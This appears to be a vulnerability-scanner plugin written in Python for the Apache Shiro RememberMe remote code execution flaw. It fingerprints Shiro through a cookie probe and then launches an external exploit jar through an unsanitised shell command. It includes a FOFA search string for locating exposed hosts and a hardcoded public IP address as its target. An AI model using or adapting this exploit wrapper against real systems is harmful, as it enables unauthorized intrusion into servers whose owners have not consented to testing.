#coding:utf-8
import os.path
import os
import requests

class c2Class(object):
	def __init__(self):
		self.vulname = 'Shiro RememberMe RCE'
		self.vulsystem= 'Shiro'
		self.vulversion = ''
		self.fofa='app="Apache-Shiro"'
		self.refer= ''
		self.testisok=True

		self.headers={'Cookie': 'rememberMe=1'}
		self.check_shiro='rememberMe=deleteMe'
		self.dir=os.path.dirname(os.path.abspath(__file__))
		self.cmd='java -jar "%s\\shiro_tool.jar" '%self.dir
		self.flag='can be use'
	def c2Func(self,target):
		status=0
		returnData=''
		try:
			rh=requests.get(url=target,headers=self.headers,verify=False).headers
			if 'Set-Cookie' in rh and self.check_shiro in rh['Set-Cookie']:
				# print(rh)
				cmd=self.cmd+target
				# print(cmd)
				run_back=os.popen(cmd).read()
				if self.flag in run_back:
					returnData='%s is likely to be vulnrable.The vuln is Shiro RememberMe RCE.The payloa is [%s].'%(target,cmd) #
					status=1
				# print(run_back)
		except Exception as e:
			# print(e)
			returnData=str(e)
		return status,returnData


if __name__ == '__main__':
	target='https://101.132.173.222/login'
	pocObj=c2Class()
	print(pocObj.c2Func(target))
